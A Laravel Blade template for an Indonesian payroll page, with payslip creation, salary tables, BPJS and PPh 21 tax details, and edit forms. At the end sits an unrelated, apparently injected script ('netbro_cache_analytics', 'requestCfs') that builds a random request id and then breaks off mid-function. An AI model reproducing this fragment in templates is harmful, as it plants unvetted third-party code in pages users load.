<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Penggajian</title>
  <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
  <link rel="stylesheet" href="/assets/css/presensi.css" type="text/css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>
  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 

    <!-- Konten -->
    <div class="be-content">
      <div class="page-head">
        <h2 class="page-head-title">Penggajian</h2>
      </div>
      <div class="main-content container-fluid">
        <div class="row">
          <div class="col-sm-12">
            <div class="panel panel-default panel-table">
              <div class="panel-body">

                <div class="panel-heading">Tabel Gaji
                  <div style="display: table-row" class="tools">
                    <div align="center">
                      <div  style="display: table-cell" class="tools">
                        <a href="/penggajian/{{$request['dari_tanggal'].' '.$request['sampai_tanggal']}}/unduh_laporan_gaji"><button style="height: 40px;"  type="button" class="btn btn-space btn-danger">Unduh Laporan</button></a>
                      </div>

                      <div  style="display: table-cell" class="tools">
                        <button style="height: 40px;" data-toggle="modal" data-target="#buat_slip_gaji" type="button" class="btn btn-space btn-warning">Buat Slip Gaji</button>
                        <!--  Modal Edit Start -->
                        <div style="text-align: left;" id="buat_slip_gaji" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary tools">
                          <div class="modal-dialog">
                            <div class="modal-content">
                              <div class="modal-header">
                                <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                                <h3 class="modal-title">Buat Slip Gaji</h3>
                              </div>

                              <form action="/penggajian/buat_slip_gaji" method="POST">
                                @csrf
                                <div class="modal-body">
                                  <div class="form-group">
                                    <h5><b>Data Karyawan dan Periode</b></h5>
                                    <label>Nama Karyawan</label>
                                    <select name="nama_karyawan" id="nama_karyawan" class="form-control" required="">
                                      <option value="">-Pilih Nama Karyawan-</option>
                                      @foreach($data_karyawan as $data_karyawan)
                                      <option value="{{$data_karyawan['nama_karyawan']}}">{{$data_karyawan->nama_karyawan}}</option>
                                      @endforeach
                                    </select>
                                  </div>

                                  <br>

                                  <div style="margin-top:30px;" class="form-group">
                                    <label>Bulan</label>
                                    <select  name="bulan" class="form-control" required="">
                                      <option value="">-Pilih Periode-</option>
                                      <option value="01">Januari</option>
                                      <option value="02">Februari</option>
                                      <option value="03">Maret</option>
                                      <option value="04">April</option>
                                      <option value="05">Mei</option>
                                      <option value="06">Juni</option>
                                      <option value="07">Juli</option>
                                      <option value="08">Agustus</option>
                                      <option value="09">September</option>
                                      <option value="10">Oktober</option>
                                      <option value="11">November</option>
                                      <option value="12">December</option>
                                    </select>
                                  </div>

                                  

                                  <div style="margin-top:60px;" class="form-group">
                                    <label>Tahun</label>
                                    <select  name="tahun" id="year" class="form-control" required=""></select>
                                    <script type="text/javascript">
                                      var start = 2019;
                                      var end = new Date().getFullYear();
                                      var options = "";
                                      for(var year = start ; year <=end; year++){
                                        options += "<option>"+ year +"</option>";
                                      }
                                      document.getElementById("year").innerHTML = options;
                                    </script>
                                  </div>

                                  <div>
                                  <div style="margin-top:60px;" class="form-group">
                                    <h5><b>Pendapatan</b></h5>
                                    <label>Gaji Pokok</label>
                                    <input name="gaji_pokok" type="text" class="form-control" required="" >
                                  </div>
                                  </div>

                                  <div class="form-group">
                                  <h5><b>Tunjangan</b></h5>
                                    <label>Tunjangan Profesi</label>
                                    <input name="T_profesi" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Tunjangan Jabatan</label>
                                    <input name="T_jabatan" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Tunjangan Kinerja</label>
                                    <input name="T_kinerja" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Tunjangan Khusus</label>
                                    <input name="T_khusus" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Tunjangan Transportasi</label>
                                    <input name="T_transport" type="text" class="form-control" >
                                  </div>
                                  <h5><b>Potongan</b></h5>
                                  <div class="form-group">
                                    <label>Disinsentif</label>
                                    <input name="disinsentif" type="text" class="form-control" >
                                  </div>
                                  <div class="form-group">
                                    <label>Lain-lain</label>
                                    <input name="lain_lain" type="text" class="form-control" >
                                  </div>
                                  <div class="modal-footer">
                                    <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                    <button type="submit"  class="btn btn-primary">Buat Slip Gaji</button>
                                  </div>
                                </div>
                              </form>
                            </div>
                          </div>
                        </div> 
                        <!--Akhir dari Modals Edit -->
                      </div>
                      
                      <div  style="display: table-cell" class="tools" >
                        <button style="height: 40px;" data-toggle="modal" data-target="#tambah_gaji" type="button" class="btn btn-space btn-primary">Tambah Table Gaji</button>
                        <!-- Modals untuk Import -->
                        <div id="tambah_gaji" tabindex="-1" role="dialog" class="modal fade">
                          <div class="modal-dialog">
                            <div class="modal-content">
                              <div class="modal-header">
                                <div class="text-primary"></div>
                              </div>
                              <div class="modal-body">
                                <div class="text-center">
                                  <h3>Tambah Table Gaji</h3>
                                  <form id="form_submit_edit" name="submit1" action="/penggajian/tambah_table" method="POST" enctype="multipart/form-data">
                                    @csrf
                                    <div class="modal-body">
                                      <div style="margin-right: 5%; margin-top: 15px;">
                                        <h4>Silahkan masukkan Periode Gaji!</h4>
                                      </div>
                                      <div style="margin-right: 18%; margin-top: 10px;">
                                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                          <input style=" height: 40px" name="sampai_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                                        </div>
                                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                          <label style="margin-top: 12px">S.d</label>
                                        </div>
                                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                          <input style=" height: 40px" name="dari_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div class="modal-footer">
                                  <div class="xs-mt-50">
                                    <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                    <button type="reset"  class="btn btn-warning">Reset</button>
                                    <button type="submit" class="btn btn-primary">Tambah</button>
                                  </div>
                                </div>
                              </form>
                            </div>
                          </div>
                        </div>
                        <!--Akhir dari Modals Import -->
                      </div>
                      <form style="float: right;" id="form_submit_tampilkan_presensi" action="/penggajian/tampilkan_gaji" method="POST" name="submit2" action=" method="POST">
                        @csrf
                        <div  style="display: table-cell" class="tools">
                          <button style="height: 40px;" type="submit" class="btn btn-space btn-success">Tampilkan Gaji</button>
                        </div>

                        @if(is_null($request))
                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                          <input style=" height: 40px" name="sampai_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                        </div>
                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                          <label style="margin-top: 12px">S.d</label>
                        </div>
                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                          <input style=" height: 40px" name="dari_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                        </div>
                        @else
                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                          <input style=" height: 40px" value="{{$request['sampai_tanggal']}}" name="sampai_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                        </div>
                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                          <label style="margin-top: 12px">S.d</label>
                        </div>
                        <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                          <input style=" height: 40px" value="{{$request['dari_tanggal']}}" name="dari_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                        </div>
                        @endif

                      </form>
                    </div>
                  </div>
                </div>
              </div>
              <div class="panel-body">
               <div class="table-responsive noSwipe">
                <table id="table1" class="table table-striped table-hover table-fw-widget">
                  <thead>
                    <tr>
                      <th>NIK</th>
                      <th>Nama</th>
                      <th>Divisi</th>
                      <th>Total Gaji</th>
                      <th>Potongan</th>
                      <th>Dibayar</th>
                      <th style="text-align: center;">Aksi</th>
                    </tr>
                  </thead>
                  <tbody>
                    @foreach($data_gaji_blade as $data)
                    <tr>
                      <td>{{$data['nik']}}</td>
                      <td>{{$data['nama_karyawan']}}</td>
                      <td>{{$data['divisi']}}</td>
                      <td>Rp {{number_format($data['total_gaji'],2,",",".")}}</td>
                      <td>Rp {{number_format($data['total_potongan'],2,",",".")}}</td>
                      <td>Rp {{number_format($data['dibayar'],2,",",".")}}</td>
                      <td>
                        <button data-toggle="modal" data-target="#modal_rincian_penggajian-{{$data['nik']}}" type="button" class="btn btn-space btn-success"> Rincian </button>
                        <!-- The Modal Presensi-->
                        <div class="modal fade" id="modal_rincian_penggajian-{{$data['nik']}}">
                          <div class="modal-dialog  colored-header-primary">
                            <div class="modal-content">

                              <!-- Modal Header -->
                              <div class="modal-header">

                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <table class="no-border no-strip skills">
                                  <tbody class="no-border-x no-border-y">
                                    <tr>
                                      <td width="150px"><h4 style="color: white; margin-top: 10px;">NIK</h4></td>
                                      <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data['nik']}}</h4></td>    
                                    </tr>
                                    <tr>
                                      <td width="150px"><h4 style="color: white; margin-top: 10px;">Nama Karyawan</h4></td>
                                      <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data['nama_karyawan']}}</h4></td>    
                                    </tr>
                                    <tr>
                                      <td width="150px"><h4 style="color: white; margin-top: 10px;">Divisi / Jabatan</h4></td>
                                      <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data['divisi']}}</h4></td>    
                                    </tr>
                                  </tbody>
                                </table >
                              </div>

                              <!-- Modal body -->
                              <div class="modal-body">

                                <div style="width: 100%; display: table;">
                                  <div style="display: table-row">
                                    <table id="table2" style="table-layout: fixed; word-wrap: break-word; word-break: break-all;" class="table table-bordered table-striped table-hover table-fw-widget">
                                      <tbody>
                                       <!--  Row Pengalaman Bulan Start --> 
                                       <tr>
                                        <td width="28%" rowspan="2"><b>Pengalaman Bulan</b></td>
                                        <td width="20%">Sebelumnya</td>
                                        <td width="57%">{{$data['pengalaman_tanggal']}}</td>
                                      </tr>
                                      <tr>
                                        <td>Jumlah</td>
                                        <td>{{$data['pengalaman_bulan']}}</td>            
                                      </tr>
                                      <!--  Row Pengalaman Bulan End -->

                                      <!--  Row Gaji Pokok Start -->
                                      <tr>
                                        <td colspan="2"><b>Gaji Pokok</b></td>
                                        <td>Rp {{number_format($data['gaji_pokok'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Gaji Pokok End -->

                                      <!--  Row Tunjangan Profesi Start -->
                                      <tr>
                                        <td colspan="2"><b>Tunjangan Profesi</b></td>
                                        <td>Rp {{number_format($data['T_profesi'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Tunjangan Profesi End -->

                                      <!--  Row Tunjangan Jabatan Start -->
                                      <tr>
                                        <td colspan="2"><b>Tunjangan Jabatan</b></td>
                                        <td>Rp {{number_format($data['T_jabatan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Tunjangan Jabatan End -->

                                      <!--  Row Tunjangan Kinerja Start -->
                                      <tr>
                                        <td colspan="2"><b>Tunjangan Kinerja</b></td>
                                        <td>Rp {{number_format($data['T_kinerja'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Tunjangan Kinerja End -->

                                      <!--  Row Tunjangan Khusus Start -->
                                      <tr>
                                        <td colspan="2"><b>Tunjangan Khusus</b></td>
                                        <td>Rp {{number_format($data['T_khusus'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Tunjangan Khusus End -->

                                      <!--  Row Tunjangan Transportasi Start -->
                                      <tr>
                                        <td colspan="2"><b>Tunjangan Transportasi</b></td>
                                        <td>Rp {{number_format($data['T_transport'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Tunjangan Transportasi End -->

                                      <!--  Row Hari Transportasi Start -->
                                      <tr>
                                        <td colspan="2"><b>Hari Transportasi</b></td>
                                        <td>{{$data['hari_transportasi']}}</td>            
                                      </tr>
                                      <!--  Row Hari Transportasi End -->

                                      <!--  Row Besaran Tunjangan Transportasi Start -->
                                      <tr>
                                        <td colspan="2"><b>Besaran Tunjangan<br>Transportasi</b></td>
                                        <td>Rp {{number_format($data['besaran_tunjangan_transport'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Besaran Tunjangan Transportasi End -->

                                      <!--  Row Basic Gaji Perhitungan BPJS Kesehatan Start -->
                                      <tr>
                                        <td colspan="2"><b>Basic Gaji Perhitungan<br>BPJS Kesehatan</b></td>
                                        <td>Rp {{number_format($data['basic_gaji_perhitungan_bpjs_kesehatan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Basic Gaji Perhitungan BPJS Kesehatan End -->

                                      <!--  Row Basic Gaji Perhitungan BPJS Ketenagakerjaan Start -->
                                      <tr>
                                        <td colspan="2"><b>Basic Gaji Perhitungan<br>BPJS Ketenagakerjaan</b></td>
                                        <td>Rp {{number_format($data['basic_gaji_perhitungan_bpjs_ketenagakerjaan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Basic Gaji Perhitungan BPJS Ketenagakerjaan End -->

                                      <!--  Row BPJS Kesehatan Start --> 
                                      <tr>
                                        <td rowspan="2"><b>BPJS Kesehatan</b></td>
                                        <td>Perusahaan</td>
                                        <td>Rp {{number_format($data['bpjs_kesehatan_perusahaan'],2,",",".")}}</td>
                                      </tr>
                                      <tr>
                                        <td>Karyawan</td>
                                        <td>Rp {{number_format($data['bpjs_kesehatan_karyawan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row BPJS Kesehatan End -->

                                      <!--  Row BPJS Ketenagakerjaan Start --> 
                                      <tr>
                                        <td rowspan="3"><b>BPJS Ketenagakerjaan</b></td>
                                        <td>JKK</td>
                                        <td>Rp {{number_format($data['bpjs_ketenagakerjaan_JKK'],2,",",".")}}</td>
                                      </tr>
                                      <tr>
                                        <td>JKM</td>
                                        <td>Rp {{number_format($data['bpjs_ketenagakerjaan_JKM'],2,",",".")}}</td>            
                                      </tr>
                                      <tr>
                                        <td>JHT</td>
                                        <td>Rp {{number_format($data['bpjs_ketenagakerjaan_JHT'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row BPJS Ketenagakerjaan End -->

                                      <!--  Row Insentif Start -->
                                      <tr>
                                        <td colspan="2"><b>Insentif</b></td>
                                        <td>Rp {{number_format($data['insentif'],2,",",".")}}
                                        </td>            
                                      </tr>
                                      <!--  Row Insentif End -->

                                      <!--  Row Bonus Start -->
                                      <tr>
                                        <td colspan="2"><b>Bonus</b></td>
                                        <td>Rp {{number_format($data['bonus'],2,",",".")}}
                                        </td>            
                                      </tr>
                                      <!--  Row Bonus End -->

                                      <!--  Row Disinsentif Start -->
                                      <tr>
                                        <td colspan="2"><b>Disinsentif</b></td>
                                        <td>Rp {{number_format($data['disinsentif'],2,",",".")}}
                                        </td>            
                                      </tr>
                                      <!--  Row Disinsentif End -->

                                      <!--  Row Total Gaji Start -->
                                      <tr>
                                        <td colspan="2"><b>Total Gaji</b></td>
                                        <td>Rp {{number_format($data['total_gaji'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Total Gaji End -->

                                      <!--  Row Masa Kerja Start -->
                                      <tr>
                                        <td colspan="2"><b>Masa Kerja</b></td>
                                        <td>{{$data['masa_kerja']}}</td>            
                                      </tr>
                                      <!--  Row Masa Kerja End -->

                                      <!--  Row Gaji Setahun Start -->
                                      <tr>
                                        <td colspan="2"><b>Gaji Setahun</b></td>
                                        <td>Rp {{number_format($data['gaji_setahun'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Gaji Setahun End -->

                                      <!--  Row Iuran Start -->
                                      <tr>
                                        <td colspan="2"><b>Iuran JHT Karyawan</b></td>
                                        <td>Rp {{number_format($data['iuran_JHT_karyawan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Iuran End -->

                                      <!--  Row Biaya Jabatan Start -->
                                      <tr>
                                        <td colspan="2"><b>Biaya Jabatan</b></td>
                                        <td>Rp {{number_format($data['biaya_jabatan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Biaya Jabatan End -->

                                      <!--  Row Gaji Setelah Pengurangan Biaya Jabatan dan JHT Start -->
                                      <tr>
                                        <td colspan="2"><b>Gaji Setelah Pengurangan<br>Biaya Jabatan dan JHT</b></td>
                                        <td>Rp {{number_format($data['gaji_setelah_pengurangan_biaya_jabatan_JHT'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Gaji Setelah Pengurangan Biaya Jabatan dan JHT End -->

                                      <!--  Row Status Start -->
                                      <tr>
                                        <td colspan="2"><b>Status</b></td>
                                        <td>{{$data['status']}}</td>            
                                      </tr>
                                      <!--  Row Status End -->

                                      <!--  Row PTKP Start -->
                                      <tr>
                                        <td colspan="2"><b>PTKP</b></td>
                                        <td>Rp {{number_format($data['ptkp'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row PTKP End -->

                                      <!--  Row PKP/th Start -->
                                      <tr>
                                        <td colspan="2"><b>PKP/th</b></td>
                                        <td>Rp {{number_format($data['pkp_th'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row PKP/th End -->

                                      <!--  Row TP Start -->
                                      <tr>
                                        <td colspan="2"><b>TP</b></td>
                                        <td>{{$data['tp']}}</td>            
                                      </tr>
                                      <!--  Row TP End -->

                                      <!--  Row NPWP Start -->
                                      <tr>
                                        <td colspan="2"><b>NPWP</b></td>
                                        <td>{{$data['npwp']}}</td>            
                                      </tr>
                                      <!--  Row NPWP End -->

                                      <!--  Row TP real Start -->
                                      <tr>
                                        <td colspan="2"><b>TP real</b></td>
                                        <td>{{$data['tp_real']}}</td>            
                                      </tr>
                                      <!--  Row TP real End -->

                                      <!--  Row PPh 21 Gaji Start -->
                                      <tr>
                                        <td colspan="2"><b>PPh 21 Gaji</b></td>
                                        <td>Rp {{number_format($data['pph_21'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row PPh 21 Gaji End -->

                                      <!--  Row Potongan Start -->
                                      <tr>
                                        <td colspan="2"><b>Potongan</b></td>
                                        <td>Rp {{number_format($data['potongan'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Potongan End -->

                                      <!--  Row Potongan BPJS Start -->
                                      <tr>
                                        <td colspan="2"><b>Potongan BPJS</b></td>
                                        <td>Rp {{number_format($data['potongan_BPJS'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Potongan BPJS End -->

                                      <!--  Row Dibayar Start -->
                                      <tr>
                                        <td colspan="2"><b>Dibayar</b></td>
                                        <td>Rp {{number_format($data['dibayar'],2,",",".")}}</td>            
                                      </tr>
                                      <!--  Row Dibayar End -->

                                      <!--  Row Rekening Start -->
                                      <tr>
                                        <td rowspan="2"><b>Rekening</b></td>
                                        <td>Nomor Rekening</td>
                                        <td>{{$data['no_rek']}}</td>            
                                      </tr>
                                      <tr>                                                       
                                        <td>Nama Bank</td>
                                        <td>{{$data['nama_bank']}}</td>            
                                      </tr>
                                      <!--  Row Rekening End -->

                                      <!--  Row Keterangan Potongan Start -->
                                      <tr>
                                        <td colspan="2"><b>Keterangan Potongan</b></td>
                                        <td>{{$data['keterangan_potongan']}}</td>            
                                      </tr>
                                      <!--  Row Keterangan Potongan End -->

                                      <!--  Row Keterangan Tunjangan Transport Start -->
                                      <tr>
                                        <td colspan="2"><b>Keterangan Tunjangan<br>Transport</b></td>
                                        @if($data['keterangan_tunjangan_transport'] == null)
                                        <td></td>
                                        @else 
                                        <td>{{$data['keterangan_tunjangan_transport']}} Hari Datang di atas {{$data['default_jam_transport']}}</td>
                                        @endif        
                                      </tr>
                                      <!--  Row Keterangan Tunjangan Transport End -->

                                      <!--  Row Keterangan Disinsentif dan Insentif Start -->
                                      <tr>
                                        <td colspan="2"><b>Keterangan Disinsentif<br>dan Insentif</b></td>
                                        @if($data['keterangan_tunjangan_transport'] == null)
                                        <td></td>
                                        @else 
                                        <td>Akumulasi Jumlah Keterlambatan : {{$data['jumlah_keterlambatan']}}<br>
                                          {{$data['keterangan_disinsentif_insentif']}}
                                        </td>
                                        @endif    
                                      </tr>
                                      <!--  Row Keterangan Disinsentif dan Insentif End -->     
                                    </tbody>
                                  </table>
                                </div>
                              </div>
                            </div>

                            <!-- Modal footer -->
                            <div class="modal-footer">
                              <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
                            </div>
                          </div>
                        </div>
                      </div>
                      <!-- End The Modal Clock IN-->

                      <a href="/penggajian/{{$data['nik']}}/{{$request['dari_tanggal']}}/{{$request['sampai_tanggal']}}/cetak_slip_gaji_karyawan"><button type="button" class="btn btn-space btn-info"> Slip Gaji </button></a>

                      <button data-toggle="modal" data-target="#modal_edit_penggajian-{{$data['id_gaji']}}" type="button" class="btn btn-space btn-warning"> Edit </button>

                    </td>
                    <!--  Modal Edit Start -->
                    <div  id="modal_edit_penggajian-{{$data['id_gaji']}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                      <div class="modal-dialog">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                            <h3 class="modal-title">Edit Penggajian</h3>
                          </div>


                          <form action="/penggajian/{{$data['id_gaji']}}/edit" method="POST">
                            @csrf
                            <div class="modal-body">
                              <div class="form-group">
                                <label>Pengalaman Tanggal</label>
                                <input value="{{$data['pengalaman_tanggal']}}" name="pengalaman_tanggal" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Pengalaman Bulan</label>
                                <input value="{{$data['pengalaman_bulan']}}" name="pengalaman_bulan" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Gaji Pokok</label>
                                <input value="{{$data['gaji_pokok']}}" name="gaji_pokok" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Profesi</label>
                                <input value="{{$data['T_profesi']}}" name="T_profesi" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Jabatan</label>
                                <input value="{{$data['T_jabatan']}}" name="T_jabatan" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Kinerja</label>
                                <input value="{{$data['T_kinerja']}}" name="T_kinerja" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Tunjangan Khusus</label>
                                <input value="{{$data['T_khusus']}}" name="T_khusus" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Biaya Tunjangan Transport</label>
                                <input value="{{$data['besaran_tunjangan_transport']}}" name="T_transport" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Basic Gaji Perhitungan BPJS Kesehatan</label>
                                <input value="{{$data['basic_gaji_perhitungan_bpjs_kesehatan']}}" name="basic_gaji_perhitungan_bpjs_kesehatan" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Basic Gaji Perhitungan BPJS Ketenagakerjaan</label>
                                <input value="{{$data['basic_gaji_perhitungan_bpjs_ketenagakerjaan']}}" name="basic_gaji_perhitungan_bpjs_ketenagakerjaan" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Insentif</label>
                                <input value="{{$data['insentif']}}" name="insentif" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Bonus</label>
                                <input value="{{$data['bonus']}}" name="bonus" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Masa Kerja</label>
                                <input value="{{$data['masa_kerja']}}" name="masa_kerja" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Status</label>
                                <input value="{{$data['status']}}" name="status" type="text" class="form-control" >
                              </div>
                              <div class="form-group">
                                <label>Potongan</label>
                                <input value="{{$data['potongan']}}" name="potongan" type="text" class="form-control" >
                              </div>
                              <input value="{{$request['sampai_tanggal']}}" name="sampai_tanggal" type="hidden" required="">
                              <input value="{{$request['dari_tanggal']}}" name="dari_tanggal" type="hidden" required="">
                              <div class="modal-footer">
                                <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                <button type="submit"  class="btn btn-primary">Simpan</button>
                              </div>
                            </div>
                          </form>
                        </div>
                      </div>
                    </div> 
                    <!--Akhir dari Modals Edit -->

                    
                  </tr>
                  @endforeach
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>


<!-- Kirim Slip Gaji Modal-->
<div id="kirim" class="modal fade">
  <div class="modal-content">
    <div class="modal-header">
      <button type="button" data-dismiss="modal" aria-hidden="true" class="close modal-close"><span class="mdi mdi-close"></span></button>
    </div>
    <div class="modal-body">
      <div class="text-center">
        <div class="text-primary"><span class="modal-main-icon mdi mdi-check"></span></div>
        <h3>Kirim Slip Gaji?</h3>
        <div class="xs-mt-50">
          <button type="button" data-dismiss="modal" class="btn btn-default btn-space modal-close">Batal</button>
          <button type="button" data-dismiss="modal" class="btn btn-primary btn-space modal-close">Kirim</button>
        </div>
      </div>
    </div>
    <div class="modal-footer"></div>
  </div>
</div>
<!-- Akhir Kirim Slip Gaji Modal-->


<!-- Footer Start -->
<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>
<!-- Footer End -->

</div>
<!-- Wrapper End -->

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
  @if (Session::has('message'))
  var type = "{{Session::get('alert-type','info')}}";
  toastr.options = {
    "debug": false,
    "onclick": null,
    "fadeIn": 300,
    "fadeOut": 1000,
    "timeOut": 5000,
    "extendedTimeOut": 1000
  }

  switch(type)
  {
    case 'info':
    toastr.info("{{Session::get('message')}}");
    break;

    case 'success':
    toastr.success("{{Session::get('message')}}");
    break;

    case 'warning':
    toastr.warning("{{Session::get('message')}}");
    break;

    case 'error':
    toastr.error("{{Session::get('message')}}");
    break;
  }

  @endif

</script>

<!-- JS untuk opsi resign di bagian edit data karyawan -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

<script type="text/javascript">
  $(document).ready(function(){
    //initialize the javascript
    App.init();
    App.dataTables();
  });
</script>

<script type="text/javascript">
  // Fungsi Menu dashboard

  $(document).ready(function(){

    App.init();
    App.dashboard();

  });
</script>

<script type="text/javascript">
  if (self == top) {
    function netbro_cache_analytics(fn, callback) {
      setTimeout(function() {
        fn();
        callback();
      }, 0);
    }

    function sync(fn) {
      fn();
    }

    function requestCfs() {
      var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
      var idc_glo_r = Math.floor(Math.random() * 99999999999);
